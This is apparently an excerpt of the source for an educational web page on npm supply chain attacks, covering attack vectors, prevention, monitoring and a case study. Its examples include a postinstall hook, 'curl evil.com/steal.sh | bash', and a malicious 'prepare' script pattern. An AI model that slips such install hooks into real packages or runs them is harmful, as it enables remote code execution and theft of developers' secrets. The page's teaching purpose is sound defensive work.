...
export default function EducationPage() {
    ...
    "attack-vectors": {
      ...
      sections: [
        ...
        },
        {
          ...
          content:
            "NPM packages can execute arbitrary code during installation through lifecycle scripts.",
          code: `{
  "scripts": {
    ...
    "postinstall": "curl evil.com/steal.sh | bash"
        ...
        },
        {
          ...
          content:
            "Malware specifically targets development credentials and secrets.",
          points: [
        ...
        },
        {
          ...
          content:
            "Advanced attacks use stolen credentials to exfiltrate data to unrelated repositories.",
          points: [
        ...
        {
          title: "Mini Shai-Hulud: optionalDependencies Injection",
          content:
            "The May 2026 Mini Shai-Hulud campaign used a novel vector: injecting malicious optionalDependencies into package.json, combined with suspicious prepare scripts.",
          code: `{
  ...
  "scripts": {
    "prepare": "bun run tanstack_runner.js && exit 1"
          ...
          points: [
            "Malicious package injected via optionalDependencies",
            "Uses exact commit hash from orphaned branch",
            'Prepare script runs on install with "exit 1" + "bun" pattern',
            "Payload delivered before build fails",
          ],
        },
      ],
    },
      ...
      sections: [
        {
          ...
          content:
            "Implement strict controls over package installation and updates.",
          points: [
        ...
        },
        {
          ...
          content:
            "Secure your build and deployment pipelines against supply chain attacks.",
          points: [
      ...
      sections: [
        {
          ...
          content:
            "Implement continuous monitoring of your software supply chain.",
          points: [
        ...
        },
        {
          ...
          content:
            "Tools and techniques for investigating suspected compromises.",
          points: [
    ...
    "case-study": {
      ...
      sections: [
        ...
        },
        {
          ...
          content:
            "Deep dive into the malware mechanics and propagation methods.",
          points: [
      ...
      <header className="border-b border-red-900/50 bg-[#0a0a0a]">
        <div className="max-w-6xl mx-auto px-6 py-6">
          ...
          <p className="text-gray-400">
            Learn about supply chain attacks, prevention strategies, and best
            practices for securing your development lifecycle.
          </p>
        </div>
      </header>
      ...
      <main className="max-w-6xl mx-auto px-6 py-8">
        <div className="space-y-8">
          {currentContent.sections.map((section, index) => (
            <section
              key={index}
              className="bg-[#0a0a0a] border border-gray-800 rounded-sm p-6"
            >
